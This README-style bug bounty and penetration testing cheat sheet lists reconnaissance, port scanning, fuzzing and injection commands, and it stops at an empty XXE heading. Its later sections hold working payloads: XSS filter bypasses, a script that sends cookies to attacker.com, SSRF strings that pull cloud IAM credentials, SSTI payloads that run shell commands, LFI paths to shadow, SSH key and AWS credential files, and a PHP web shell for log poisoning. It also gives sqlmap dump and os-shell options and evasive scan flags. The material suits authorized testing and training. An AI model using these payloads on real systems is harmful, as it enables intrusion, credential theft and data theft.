# BB-TOOLKIT — Bug Bounty & Penetration Testing

```
██████╗ ██████╗       ████████╗██╗  ██╗
██╔══██╗██╔══██╗         ██╔══╝██║ ██╔╝
██████╔╝██████╔╝█████╗   ██║   █████╔╝
██╔══██╗██╔══██╗╚════╝   ██║   ██╔═██╗
██████╔╝██████╔╝         ██║   ██║  ██╗
╚═════╝ ╚═════╝          ╚═╝   ╚═╝  ╚═╝
```

> **200+ Commands | 12 Vuln Types | Auto Bash Script | All Phases Covered**
> 
> **For authorized security research only. Always get written permission before testing.**
> 
> *Compiled from public CVE databases, OWASP, HackerOne disclosures & engineering docs.*

---

## Table of Contents

1. [Phase 1: Passive Reconnaissance](#phase-1-passive-reconnaissance)
2. [Phase 2: Port Scanning & Service Fingerprinting](#phase-2-port-scanning--service-fingerprinting)
3. [Phase 3: Web Application Enumeration](#phase-3-web-application-enumeration)
4. [Phase 4: Vulnerability Scanning](#phase-4-vulnerability-scanning)
5. [Phase 5: XSS & Injection Testing](#phase-5-xss--injection-testing)
6. [Phase 6: Authentication, Authorization & API Testing](#phase-6-authentication-authorization--api-testing)
7. [Phase 7: Database & Storage Attacks](#phase-7-database--storage-attacks)
8. [Phase 8: Cloud Infrastructure Testing](#phase-8-cloud-infrastructure-testing)
9. [Phase 9: Framework & Technology-Specific Testing](#phase-9-framework--technology-specific-testing)
10. [Phase 10: Post-Exploitation & Privilege Escalation](#phase-10-post-exploitation--privilege-escalation)
11. [Phase 11: Vulnerability Type Reference](#phase-11-vulnerability-type-reference)
12. [Phase 12: Automated Bash Script](#phase-12-automated-bash-script)

---

## Phase 1: Passive Reconnaissance

> **Passive Reconnaissance** — Gather information about the target without sending a single packet. Uses OSINT, certificate transparency, DNS records, and public databases. **Zero risk of detection.**

### Subdomain Enumeration

#### subfinder — Fast passive subdomain discovery using 100+ sources
**Severity:** INFO | **Type:** PASSIVE

```bash
subfinder -d TARGET -o subfinder_TARGET.txt -v
subfinder -d TARGET -all -recursive -o subfinder_all_TARGET.txt
```

**Explanation:** `-d` target domain. `-all` uses all sources (slower but thorough). `-recursive` finds sub-subdomains like dev.api.target.com. Output saved for chaining into other tools.
**Install:** `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`

---

#### amass — OWASP Amass — most comprehensive subdomain + ASN enumeration
**Severity:** INFO | **Type:** PASSIVE

```bash
amass enum -passive -d TARGET -o amass_TARGET.txt
amass enum -active -d TARGET -brute -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o amass_active_TARGET.txt
```

**Explanation:** `-passive` uses OSINT only (no DNS queries to target). `-active` resolves each subdomain. `-brute` brute-forces with wordlist. Results include ASN numbers, CIDR ranges, and netblocks.
**Install:** `go install github.com/owasp-amass/amass/v4/...@master`

---

#### assetfinder — Find domains and subdomains using free OSINT sources
**Severity:** INFO | **Type:** PASSIVE

```bash
assetfinder --subs-only TARGET | tee assetfinder_TARGET.txt
assetfinder TARGET | sort -u | tee -a assetfinder_TARGET.txt
```

**Explanation:** `--subs-only` returns only confirmed subdomains (not related domains). Quick and lightweight. Good for initial recon.
**Install:** `go install github.com/tomnomnom/assetfinder@latest`

---

#### crt.sh (Certificate Transparency) — Search SSL/TLS certificate logs
**Severity:** INFO | **Type:** PASSIVE

```bash
curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee crtsh_TARGET.txt

# Extended: include expired certs
curl -s "https://crt.sh/?q=TARGET&output=json" | jq -r '.[].name_value' | sort -u
```

**Explanation:** Queries certificate transparency logs. `%25.` is URL-encoded `%.` for wildcard search. `sed 's/\*\.//g'` strips wildcard markers. Returns certs even from expired/revoked certificates — great for finding old services. **No install needed.**

---

#### theHarvester — Email, hostname, IPs from public sources
**Severity:** INFO | **Type:** PASSIVE

```bash
theHarvester -d TARGET -b all -f theharvester_TARGET.html
theHarvester -d TARGET -b google,bing,crtsh,dnsdumpster -l 500
```

**Explanation:** `-b all` uses ALL sources (Google, Bing, DuckDuckGo, Baidu, Shodan, Hunter.io, etc). `-l 500` limit to 500 results. `-f` saves HTML report. Finds employee emails for phishing simulation, exposed IPs, and virtual hosts.
**Install:** `pip3 install theHarvester`

---

### DNS Intelligence

#### dig + nslookup — DNS record enumeration
**Severity:** INFO | **Type:** PASSIVE

```bash
dig TARGET ANY +short
dig TARGET A +short
dig TARGET MX +short
dig TARGET TXT +short
dig TARGET NS +short
dig TARGET AXFR @$(dig NS TARGET +short | head -1)
nslookup -type=any TARGET
```

**Explanation:** `ANY` queries all record types. `AXFR` attempts DNS zone transfer (dumps ALL DNS records if misconfigured — critical finding!). `@` queries the target's own nameserver. TXT records often leak SPF, DMARC, verification tokens, and sometimes internal IPs.

---

#### dnsx — Fast DNS resolution and wildcard filtering
**Severity:** INFO | **Type:** PASSIVE

```bash
cat subfinder_TARGET.txt amass_TARGET.txt assetfinder_TARGET.txt | sort -u | dnsx -silent -o resolved_TARGET.txt
dnsx -d TARGET -resp -a -aaaa -cname -ns -mx -txt -ptr -json -o dnsx_full_TARGET.json
```

**Explanation:** Merges all subdomain sources and resolves which ones are **actually alive**. `-resp` shows IP addresses. `-cname` shows CNAME records (important for subdomain takeover detection). JSON output enables further processing.
**Install:** `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest`

---

#### dnsrecon — DNS brute force, zone transfer, reverse lookup
**Severity:** MEDIUM | **Type:** PASSIVE

```bash
dnsrecon -d TARGET -t std
dnsrecon -d TARGET -t brt -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
dnsrecon -d TARGET -t axfr
```

**Explanation:** `-t std` standard enumeration. `-t brt` brute force with wordlist. `-t axfr` zone transfer attempt. `-t rvl` reverse lookup on IP range. Returns SOA, NS, MX, A, AAAA, and CNAME records. Zone transfer leaks entire DNS infrastructure.

---

### Historical & Archive Recon

#### waybackurls + gau — Extract all historical URLs from Wayback Machine
**Severity:** INFO | **Type:** PASSIVE

```bash
waybackurls TARGET | tee wayback_TARGET.txt
gau TARGET | tee gau_TARGET.txt

# Merge and filter interesting paths
cat wayback_TARGET.txt gau_TARGET.txt | sort -u | grep -E "\.(php|asp|aspx|jsp|json|xml|config|env|bak|sql|log)" | tee interesting_urls_TARGET.txt

# Extract parameters
cat wayback_TARGET.txt | grep "=" | qsreplace "FUZZ" | sort -u > params_TARGET.txt
```

**Explanation:** `waybackurls` queries web.archive.org. `gau` (GetAllUrls) queries Wayback, CommonCrawl, VirusTotal. The grep filters for backup files, config files, and old endpoints. `qsreplace` replaces param values for fuzzing. Old URLs often expose forgotten admin panels, backup files, and deprecated APIs.
**Install:** `go install github.com/tomnomnom/waybackurls@latest`

---

#### github-dorks — Search GitHub for exposed secrets, API keys, internal code
**Severity:** HIGH | **Type:** PASSIVE

```bash
# GitHub dorks — search manually at github.com/search
# or use trufflehog / gitleaks

trufflehog github --org=TARGET --only-verified
gitleaks detect --source=. --verbose

# Manual dorks
# site:github.com "TARGET" password
# site:github.com "TARGET" api_key
# site:github.com "TARGET" secret
# site:github.com "TARGET" token
# site:github.com "TARGET" intern
```

**Explanation:** GitHub searches expose accidentally committed secrets. `trufflehog` uses entropy analysis + regex to find secrets. `gitleaks` scans git history for leaks. Dorks search for hardcoded passwords, API keys, DB connection strings. **High impact — often leads to immediate full compromise.**

---

#### Shodan / Censys — Search for exposed services, IPs, ports
**Severity:** HIGH | **Type:** PASSIVE

```bash
# Shodan CLI (requires API key)
shodan search "ssl.cert.subject.cn:TARGET" --fields ip_str,port,org
shodan search "hostname:TARGET" --fields ip_str,port,product
shodan search org:"TARGET" --fields ip_str,port,product

# Shodan dorks
# http.title:"TARGET"
# ssl:"TARGET" 200
# org:"Slack Technologies"
```

**Explanation:** `ssl.cert.subject.cn` finds all IPs with TLS certs for this domain. `hostname` finds all services exposing this hostname. `org:` finds all services under the company's ASN. Often reveals staging environments, internal admin panels, and forgotten servers not listed in DNS.
**Install:** `pip install shodan`

---

### Subdomain Takeover

#### subjack / nuclei takeover — Detect dangling CNAME records
**Severity:** CRITICAL | **Type:** PASSIVE

```bash
subjack -w resolved_TARGET.txt -t 100 -timeout 30 -ssl -o takeovers_TARGET.txt

# nuclei subdomain takeover templates
nuclei -l resolved_TARGET.txt -t ~/nuclei-templates/takeovers/ -o nuclei_takeover_TARGET.txt

# Check for common takeover services
cat resolved_TARGET.txt | httpx -silent | grep -i "heroku\|github\|fastly\|aws\|azure\|shopify\|s3"
```

**Explanation:** `subjack` checks CNAME targets to see if they point to unclaimed Heroku, GitHub Pages, Azure, S3, Fastly apps. If a CNAME points to **app-name.herokuapp.com** and that Heroku app is unregistered, you can claim it and serve content on the subdomain. **Critical severity** — can lead to account takeovers via cookie theft.

---

## Phase 2: Port Scanning & Service Fingerprinting

> **Port Scanning & Service Fingerprinting** — Identify open ports, running services, and their versions. Moves from passive to active — target WILL see these requests. **Always confirm written authorization before running active scans.**

### Nmap — Network Mapper

#### nmap — Quick TCP
**Severity:** INFO | **Type:** ACTIVE

```bash
nmap -sV -sC -T4 -oA nmap_quick_TARGET TARGET
nmap -sV -sC -p- --min-rate 10000 -oA nmap_full_TARGET TARGET
```

**Explanation:** `-sV` service version detection. `-sC` runs default NSE scripts (banner grab, auth check, etc). `-T4` aggressive timing. `-p-` scans ALL 65535 ports. `-oA` saves in nmap/gnmap/xml format. `--min-rate 10000` sends minimum 10k packets/sec — fast but noisier.

---

#### nmap — UDP Scan
**Severity:** MEDIUM | **Type:** ACTIVE

```bash
sudo nmap -sU -sV --top-ports 200 -T4 -oA nmap_udp_TARGET TARGET
sudo nmap -sU -p 53,67,68,69,123,137,161,500,514,520,1900 -sV TARGET
```

**Explanation:** `-sU` requires `sudo`. UDP services are often forgotten — SNMP (161) leaks device info, DNS (53) may allow zone transfer, NTP (123) amplification attacks. UDP scans are slow; use `--top-ports` to limit. **SNMP community string "public" is a classic easy win.**

---

#### nmap — Vulnerability Scripts
**Severity:** HIGH | **Type:** ACTIVE

```bash
nmap -sV --script=vuln -p 21,22,25,53,80,443,3306,5432,6379,8080,8443,27017 -oA nmap_vulns_TARGET TARGET
nmap -sV --script=http-shellshock,http-slowloris,ssl-heartbleed,ssl-poodle,ms17-010 TARGET
nmap --script=http-methods,http-auth-finder,http-default-accounts TARGET
```

**Explanation:** `--script=vuln` runs ALL vulnerability detection scripts (Heartbleed, EternalBlue, etc). Specific scripts: `ssl-heartbleed` (CVE-2014-0160), `ms17-010` (EternalBlue), `http-shellshock`, `ssl-poodle`. `http-default-accounts` checks for admin/admin credentials.

---

#### nmap — Stealth SYN Scan
**Severity:** MEDIUM | **Type:** ACTIVE

```bash
sudo nmap -sS -T2 --randomize-hosts -f -oA nmap_stealth_TARGET TARGET
sudo nmap -sS -D RND:10 --spoof-mac 0 -T2 TARGET
```

**Explanation:** `-sS` SYN scan — sends SYN, receives SYN-ACK but never completes handshake (no TCP connection logged). `-T2` polite timing (slower, quieter). `-f` fragment packets. `-D RND:10` uses 10 random decoy IPs to confuse IDS. `--spoof-mac 0` randomizes MAC address.

---

### Fast Mass Scanners

#### masscan — Scan the entire internet range at 1M+ packets/second
**Severity:** HIGH | **Type:** ACTIVE

```bash
sudo masscan TARGET -p 80,443,8080,8443,21,22,25,3306,5432,6379,27017 --rate=10000 -oL masscan_TARGET.txt
sudo masscan -p1-65535 TARGET --rate=50000 --banners -oL masscan_full_TARGET.txt
```

**Explanation:** Fastest port scanner. `--rate` packets per second. `--banners` grabs service banners. Good for scanning wide IP ranges (CIDR blocks). **Warning:** can cause network disruption. Reduce rate to 1000 for less aggressive scanning.
**Install:** `apt install masscan`

---

#### rustscan — Rust-based scanner — faster than nmap
**Severity:** INFO | **Type:** ACTIVE

```bash
rustscan -a TARGET --ulimit 5000 -- -sV -sC
rustscan -a TARGET -r 1-65535 --ulimit 5000 -- -sV -sC -oA rustscan_TARGET
```

**Explanation:** `--ulimit 5000` increases file descriptor limit for speed. Everything after `--` is passed to nmap. RustScan first finds open ports (very fast), then hands off to nmap for service detection. Typically 10-100x faster than nmap for port discovery.
**Install:** `cargo install rustscan`

---

### Service-Specific Checks

#### SSH Enumeration
**Severity:** MEDIUM | **Type:** ACTIVE

```bash
ssh-audit TARGET
nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos,sshv1 TARGET
ssh -v -p 22 TARGET 2>&1 | grep -i "server_host_key"
```

**Explanation:** `ssh-audit` checks for weak algorithms (diffie-hellman-group1, arcfour cipher, MD5 MACs). `ssh-auth-methods` reveals if password auth is enabled. Old SSH versions (< 7.x) have known CVEs. Username enumeration via timing attacks was a real issue in OpenSSH < 7.7.

---

#### SSL/TLS Analysis
**Severity:** HIGH | **Type:** ACTIVE

```bash
testssl.sh --full TARGET
testssl.sh --vulnerable TARGET
sslscan TARGET:443
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params -p 443 TARGET
```

**Explanation:** `testssl.sh` is the most comprehensive TLS checker. Tests: SSLv2/3, TLS 1.0/1.1 (deprecated), weak ciphers (RC4, 3DES, EXPORT), HSTS, certificate validity, Heartbleed, POODLE, DROWN, FREAK, LOGJAM, BEAST, CRIME, BREACH, ROBOT. **Always test HTTPS endpoints.** Bug bounties pay well for TLS downgrade attacks.
**Install:** `apt install testssl.sh`

---

## Phase 3: Web Application Enumeration

> **Web Application Enumeration** — Discover hidden paths, files, technologies, and entry points. This phase finds the attack surface before launching specific vulnerability tests.

### Directory & File Brute Force

#### ffuf — Fast fuzzer — directories, files, virtual hosts, parameters
**Severity:** INFO | **Type:** WEB

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u https://TARGET/FUZZ -o ffuf_dirs_TARGET.json -of json

# File extensions
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt -u https://TARGET/FUZZ -e .php,.html,.js,.json,.xml,.bak,.config,.env,.log,.sql -fc 404 -o ffuf_files_TARGET.json

# Virtual host fuzzing
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u https://TARGET/ -H "Host: FUZZ.TARGET" -fw 839
```

**Explanation:** `-w` wordlist. `-u` URL with FUZZ placeholder. `-e` file extensions to append. `-fc 404` filter 404 responses. `-fw 839` filter by word count (tune for target). **Recommended wordlists:** SecLists. For APIs use api-endpoints-v2.txt.

---

#### feroxbuster — Recursive directory fuzzer in Rust
**Severity:** INFO | **Type:** WEB

```bash
feroxbuster -u https://TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,js,json,xml,env,bak,config -o ferox_TARGET.txt

feroxbuster -u https://TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --auto-tune --smart
```

**Explanation:** `-t 50` threads. `-x` extensions. `--auto-tune` adjusts rate automatically. `--smart` avoids known false positive directories. Auto-recursion is the killer feature — discovers /admin/, then auto-recurses into /admin/users/, etc.
**Install:** `cargo install feroxbuster`

---

#### gobuster — Classic Go directory buster — DNS and vhost modes
**Severity:** INFO | **Type:** WEB

```bash
gobuster dir -u https://TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html,js,txt,bak -t 50 -o gobuster_dir_TARGET.txt

gobuster dns -d TARGET -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r 8.8.8.8 -o gobuster_dns_TARGET.txt

gobuster vhost -u https://TARGET -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Explanation:** `dir` mode for directories. `dns` mode for subdomain brute force. `vhost` mode tests virtual hosts via Host header. `-r 8.8.8.8` use custom DNS resolver. Good general-purpose tool; combine with ffuf for thoroughness.
**Install:** `go install github.com/OJ/gobuster/v3@latest`

---

### Technology Fingerprinting

#### whatweb — Identify CMS, framework, server, JS libraries
**Severity:** INFO | **Type:** WEB

```bash
whatweb -v https://TARGET | tee whatweb_TARGET.txt
whatweb -a 3 https://TARGET  # aggression level 3

# Scan all live subdomains
cat resolved_TARGET.txt | xargs -I{} whatweb -v https://{} 2>/dev/null | tee whatweb_all_TARGET.txt
```

**Explanation:** `-v` verbose — shows all detected plugins. `-a 3` aggressive (makes more requests to fingerprint). Detects: Apache, Nginx, PHP version, WordPress, Drupal, jQuery version, React, Angular, Bootstrap, Google Analytics, Cloudflare, and 1800+ other technologies. PHP version detection is important for CVE matching.

---

#### httpx — HTTP probe — status codes, titles, tech stack, screenshots
**Severity:** INFO | **Type:** WEB

```bash
cat resolved_TARGET.txt | httpx -silent -status-code -title -tech-detect -content-length -follow-redirects -o httpx_TARGET.txt

httpx -l resolved_TARGET.txt -title -tech-detect -status-code -content-type -web-server -o httpx_full_TARGET.json -json

# Find live hosts quickly
cat all_subs_TARGET.txt | httpx -ports 80,443,8080,8443,8000,8888 -silent | tee live_hosts_TARGET.txt
```

**Explanation:** `-tech-detect` uses Wappalyzer signatures to identify technology stack. `-title` shows page title — useful for finding admin panels. `-ports` tests non-standard ports. JSON output enables parsing with `jq`. Run on all subdomains to quickly identify interesting hosts.
**Install:** `go install github.com/projectdiscovery/httpx/cmd/httpx@latest`

---

#### nikto — Web server vulnerability scanner
**Severity:** MEDIUM | **Type:** WEB

```bash
nikto -h https://TARGET -o nikto_TARGET.html -Format html
nikto -h https://TARGET -Tuning 1 2 3 4 5 6 7 8 9 0 a b c
nikto -h TARGET -port 443 -ssl -maxtime 3600
```

**Explanation:** `-Tuning` categories: 1=Interesting files, 2=Misconfig, 3=Info disclosure, 4=Injection, 5=Remote File Retrieval, 6=Denial of Service, 7=Remote Settings, 8=Command Execution, 9=SQL Injection. Nikto is noisy but finds low-hanging fruit like exposed .git/, phpinfo(), default credentials, and X-Content-Type header issues. Good for initial sweep.

---

#### curl headers — Manually inspect response headers
**Severity:** INFO | **Type:** WEB

```bash
curl -sIL https://TARGET | tee headers_TARGET.txt

# Check for missing security headers
curl -sI https://TARGET | grep -iE "x-frame-options|x-content-type|content-security-policy|strict-transport|x-server|x-powered-by"

# Check for interesting headers
curl -sI https://TARGET | grep -iE "server:|x-server:|x-powered-by:|x-aspnet|via:|x-varnish:|x-backend|cf-ray"
```

**Explanation:** Headers to look for: **X-Powered-By** leaks tech (PHP/7.4.3, ASP.NET, etc). **Server** leaks software version (Apache/2.4.18). **X-Server** reveals internal hostname. **Missing headers** (CSP, X-Frame-Options, HSTS) are bug bounty findings. **Via/X-Varnish** reveals CDN/proxy layer.

---

### JavaScript Analysis

#### linkfinder + getJS — Extract endpoints, API paths, secrets from JS files
**Severity:** HIGH | **Type:** WEB

```bash
# Get all JS files
katana -u https://TARGET -js-crawl -d 5 | grep "\.js" | tee jsfiles_TARGET.txt

# Extract endpoints from each JS file
while read url; do
  python3 linkfinder.py -i "$url" -o cli
done < jsfiles_TARGET.txt | sort -u | tee js_endpoints_TARGET.txt

# Search for secrets in JS
trufflehog filesystem --path=. --json
gitleaks detect --source=. --verbose
```

**Explanation:** JS files contain: API endpoints, internal URLs, GraphQL schemas, S3 bucket names, API keys, private tokens. `katana` crawls and finds all JS files. `linkfinder.py` extracts all URL-like patterns. `trufflehog` finds secrets using entropy + regex. **Critical:** many bug bounties pay $5k+ for secrets in JS files.
**Install:** `pip install trufflehog`

---

## Phase 4: Vulnerability Scanning

> **Automated Vulnerability Scanning** — Run templated vulnerability checks. Nuclei has 9000+ templates covering CVEs, misconfigs, exposures, and network issues.

### Nuclei — Template-Based Scanning

#### nuclei — Full Scan
**Severity:** HIGH | **Type:** WEB

```bash
nuclei -u https://TARGET -t ~/nuclei-templates/ -o nuclei_all_TARGET.txt -severity low,medium,high,critical

# Critical and high only
nuclei -u https://TARGET -severity high,critical -o nuclei_critical_TARGET.txt

# Run on all live subdomains
nuclei -l live_hosts_TARGET.txt -t ~/nuclei-templates/ -o nuclei_subs_TARGET.txt -c 50
```

**Explanation:** `-t` templates directory. `-severity` filter by severity. `-c 50` concurrent requests. Update templates with `nuclei -update-templates`. Finds: exposed admin panels, default credentials, misconfigs, known CVEs, sensitive file exposure (/.env, /config.php, /WEB-INF/web.xml), and hundreds of other issues.
**Install:** `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`

---

#### nuclei — Specific Templates
**Severity:** MEDIUM | **Type:** WEB

```bash
# Exposed files and panels
nuclei -u https://TARGET -t ~/nuclei-templates/exposures/ -t ~/nuclei-templates/panels/

# CVEs only
nuclei -u https://TARGET -t ~/nuclei-templates/cves/

# Misconfigurations
nuclei -u https://TARGET -t ~/nuclei-templates/misconfiguration/

# Subdomain takeover
nuclei -l resolved_TARGET.txt -t ~/nuclei-templates/takeovers/

# Network protocols
nuclei -u TARGET -t ~/nuclei-templates/network/
```

**Explanation:** Key template categories: **exposures/** — exposed .git, .env, phpinfo, backup files. **panels/** — admin panels (Jenkins, Grafana, Kibana, PhpMyAdmin). **cves/** — 5000+ CVE-specific checks. **misconfiguration/** — Apache, Nginx, IIS misconfigs. **takeovers/** — subdomain takeover fingerprints. Run specific categories for faster targeted scans.

---

### SQLMap — SQL Injection

#### sqlmap — Basic
**Severity:** CRITICAL | **Type:** DB

```bash
sqlmap -u "https://TARGET/search?q=test" --dbs --batch
sqlmap -u "https://TARGET/login" --data="username=admin&password=test" --dbs --batch
sqlmap -u "https://TARGET/api/user?id=1" --level=5 --risk=3 --batch --dbs
```

**Explanation:** `--dbs` enumerate databases. `--batch` non-interactive mode. `--data` POST body. `--level 1-5` depth of tests (5=max). `--risk 1-3` risk level (3=all tests including heavy). Use on any URL with parameters. SQL injection is still in OWASP Top 10 and pays $1k–$50k on bug bounty programs. **Always test login forms, search boxes, and API parameters.**

---

#### sqlmap — With Auth
**Severity:** CRITICAL | **Type:** DB

```bash
sqlmap -u "https://TARGET/api/user?id=1" \
  --cookie="session=YOUR_SESSION_COOKIE" \
  --headers="Authorization: Bearer YOUR_TOKEN" \
  --level=5 --risk=3 --dump --batch

# From Burp request file
sqlmap -r request.txt --level=5 --risk=3 --batch --dbs
```

**Explanation:** `--cookie` session token for authenticated endpoints. `-r request.txt` loads a saved Burp Suite request (most powerful — right-click in Burp → Save Item). `--dump` dumps all found tables/data. `--os-shell` attempts to get an OS shell (RCE!) on vulnerable MySQL/MSSQL. Test ALL authenticated endpoints.

---

### Miscellaneous Scanners

#### wpscan — WordPress-specific security scanner
**Severity:** HIGH | **Type:** WEB

```bash
wpscan --url https://TARGET --enumerate u,p,t,cb --api-token YOUR_TOKEN
wpscan --url https://TARGET --enumerate ap --plugins-detection aggressive
wpscan --url https://TARGET --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

**Explanation:** `--enumerate u` users, `p` plugins, `t` themes, `cb` config backups. `--plugins-detection aggressive` probes all known plugin paths. `--api-token` from wpscan.com enables CVE data. Run on any WordPress site. Outdated plugins are the most common WordPress attack vector.
**Install:** `gem install wpscan`

---

#### CMSeeK — CMS detection and vulnerability scanner for 40+ CMSes
**Severity:** MEDIUM | **Type:** WEB

```bash
python3 cmseek.py -u https://TARGET --follow-redirect
python3 cmseek.py -u https://TARGET --cms wp  # Force WordPress
python3 cmseek.py -u https://TARGET --batch
```

**Explanation:** Detects: WordPress, Joomla, Drupal, Magento, OpenCart, Prestashop, and 40+ others. For each CMS, runs specific vulnerability checks, version detection, backup file search, and admin panel discovery.
**Install:** `git clone https://github.com/Tuhinshubhra/CMSeeK`

---

## Phase 5: XSS & Injection Testing

> **Injection Vulnerabilities** — XSS, SSRF, SSTI, XXE, Command Injection, and LFI/RFI testing. These vulnerabilities are the backbone of bug bounty programs.

### XSS — Cross-Site Scripting

#### dalfox — Fastest XSS scanner with automated bypass payloads
**Severity:** HIGH | **Type:** EXPLOIT

```bash
dalfox url "https://TARGET/search?q=test" -o dalfox_TARGET.txt
dalfox file params_TARGET.txt --skip-bav -o dalfox_params_TARGET.txt

# With auth
dalfox url "https://TARGET/profile?name=test" --cookie "session=TOKEN" -o dalfox_auth_TARGET.txt

# Blind XSS (callback server)
dalfox url "https://TARGET/search?q=test" --blind https://yourxsshunter.com/callback
```

**Explanation:** `--skip-bav` skips basic attribute value tests (faster). `--blind` injects payload that calls back to your server — finds blind XSS in admin panels, log viewers, emails. Dalfox uses 7600+ payloads and automated WAF bypasses. **Most important XSS targets:** search boxes, profile fields, custom status, display names, file names.
**Install:** `go install github.com/hahwul/dalfox/v2@latest`

---

#### XSStrike — Intelligent XSS scanner with fuzzing and context analysis
**Severity:** HIGH | **Type:** EXPLOIT

```bash
python3 XSStrike.py -u "https://TARGET/search?q=test"
python3 XSStrike.py -u "https://TARGET" --crawl -l 3
python3 XSStrike.py -u "https://TARGET/api/user?name=test" --headers "Authorization: Bearer TOKEN" --json
```

**Explanation:** `--crawl` spiders the site first then tests all found parameters. `-l 3` crawl depth. `--json` for JSON POST bodies. XSStrike analyzes the reflection context (inside attribute, in script, in tag) and generates context-aware payloads. Better than brute-force tools for complex WAF bypass scenarios.
**Install:** `git clone https://github.com/s0md3v/XSStrike`

---

#### Manual XSS Payloads — Critical manual payloads for common bypass scenarios
**Severity:** HIGH | **Type:** EXPLOIT

```bash
# Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# HTML attribute context
" onmouseover="alert(1)
' autofocus onfocus='alert(1)

# JavaScript context
';alert(1)//
</script><script>alert(1)</script>

# WAF bypass
<scRiPt>alert(1)</scRiPt>
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert&#40;1&#41;>
<iframe src="javascript:alert(1)">

# Fetch cookie (exfiltrate)
<script>fetch('https://attacker.com/x?c='+document.cookie)</script>
```

**Explanation:** **Context matters:** If reflected inside `href=""`, use `javascript:alert(1)`. Inside a `<script>` tag, close it first. **WAF bypasses:** case variation, HTML entities, null bytes, alternate encodings. **Impact escalation:** Don't just alert(1) — exfiltrate cookies with `fetch()` or steal localStorage tokens for account takeover proof. This is what gets critical ratings.

---

### SSRF — Server-Side Request Forgery

#### SSRF Detection & Bypass
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
# Payloads to try in URL parameters (webhook_url, url, redirect, src, etc)
# AWS Metadata (instant critical on AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/

# Azure Metadata
http://169.254.169.254/metadata/instance

# Bypass filters
http://[::ffff:169.254.169.254]/latest/meta-data/
http://0177.0.0.254/latest/meta-data/  # Octal
http://2130706433/latest/meta-data/     # Decimal IP
http://169.254.169.254.nip.io/latest/meta-data/
```

**Explanation:** SSRF lets you make the **server** fetch a URL. AWS metadata at `169.254.169.254` returns IAM credentials — **full AWS account takeover**. Bypass techniques: `[::ffff:]` IPv6 representation, `nip.io` DNS service that resolves any IP, octal/decimal IP notation. **Critical in bug bounties** — cloud metadata SSRF = instant critical finding. Look in: image URLs, webhook endpoints, PDF generators, import functions.

---

#### ssrfmap + interactsh — Automated SSRF discovery with out-of-band callbacks
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
# Setup interactsh for OOB detection
interactsh-client -v
# Note your callback URL e.g. https://xyz.oast.me

# ssrfmap
python3 ssrfmap.py -r request.txt -p url --lhost xyz.oast.me

# Burp Collaborator alternative
# Use https://app.interactsh.com for free OAST server
```

**Explanation:** `interactsh` is the open-source Burp Collaborator alternative. Creates callback URL that records DNS/HTTP/SMTP hits. **Critical for blind SSRF** — even if you can't see the response, DNS resolution proves SSRF. `-r request.txt` uses Burp request file. `-p url` parameter to inject.
**Install:** `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`

---

### SSTI / LFI / XXE / RCE

#### SSTI — Server-Side Template Injection
**Severity:** CRITICAL | **Type:** EXPLOIT

```bash
# Detection payloads (in any user-controlled field)
{{7*7}}           # → 49 = Jinja2/Twig
${7*7}            # → 49 = FreeMarker
#{7*7}            # → 49 = Pebble/Mako
<%= 7*7 %>        # → 49 = ERB (Ruby)
{{7*'7'}}         # → 7777777 = Twig

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}
```

**Explanation:** SSTI occurs when user input is embedded directly into a template engine. **Highest impact** — typically leads to RCE. Detection: inject `{{7*7}}` — if response shows `49` you have SSTI. Each engine has different syntax; the arithmetic test identifies which engine. Look in: email subjects, profile names, error messages, PDF generators.
**Install tplmap:** `git clone https://github.com/epinna/tplmap`

---

#### LFI — Local File Inclusion
**Severity:** HIGH | **Type:** EXPLOIT

```bash
# Basic LFI payloads
/etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoded
..%252f..%252f..%252fetc%252fpasswd       # Double encoded

# PHP filters (read PHP source code)
php://filter/convert.base64-encode/resource=index.php

# Log poisoning → RCE
# 1. Poison /var/log/apache2/access.log via User-Agent
# 2. Then include: ../var/log/apache2/access.log

# Files to target
/etc/passwd
/etc/shadow
/proc/self/environ
/.aws/credentials
/home/TARGET/.ssh/id_rsa
/var/www/html/config.php
```

**Explanation:** `php://filter` reads PHP file source in base64 — reveals database passwords in config files. **Log poisoning:** set malicious User-Agent like `<?php system($_GET['cmd']); ?>`, then include the log file to execute PHP. **Files to target:** /etc/passwd (user enumeration), /proc/self/environ (env vars = secrets), ~/.aws/credentials. Use fuzzing tool with LFI wordlist from SecLists.

---

#### XXE — XML External Entity
